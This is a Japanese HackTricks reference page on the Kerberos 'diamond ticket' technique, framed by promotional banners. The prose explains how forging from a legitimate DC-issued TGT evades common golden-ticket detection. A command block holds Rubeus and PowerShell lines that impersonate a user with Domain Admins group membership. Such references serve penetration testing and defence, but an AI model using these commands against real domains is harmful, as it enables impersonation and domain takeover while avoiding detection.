# ダイヤモンドチケット

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter**で私をフォローする🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **ハッキングトリックを共有するために、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>

## ダイヤモンドチケット

**ゴールデンチケットのように**、ダイヤモンドチケットは**任意のユーザーとして任意のサービスにアクセス**できるTGTです。 ゴールデンチケットは完全にオフラインで偽造され、そのドメインのkrbtgtハッシュで暗号化され、その後使用するためにログオンセッションに渡されます。 ドメインコントローラは、正当に発行されたTGTを追跡しないため、自分自身のkrbtgtハッシュで暗号化されたTGTを喜んで受け入れます。

ゴールデンチケットの使用を検出するための2つの一般的な技術があります：

* 対応するAS-REQがないTGS-REQを探す。
* Mimikatzのデフォルトの10年間有効なライフタイムなど、愚かな値を持つTGTを探す。

**ダイヤモンドチケット**は、**DCによって発行された正当なTGTのフィールドを変更して作成**されます。 これは、**TGTを要求**し、ドメインのkrbtgtハッシュで**復号**し、チケットの必要なフィールドを**変更**してから**再度暗号化**することによって達成されます。 これにより、ゴールデンチケットの2つの前述の欠点が克服されます：

* TGS-REQには前のAS-REQがあります。
* TGTはDCによって発行されたものであり、ドメインのKerberosポリシーのすべての正しい詳細を持っています。 ゴールデンチケットでこれらを正確に偽造することができますが、より複雑でミスの可能性があります。
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、当社の独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) コレクションを発見する
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 で私をフォローする [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **ハッキングテクニックを共有するためにPRを提出して** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリに参加する

</details>
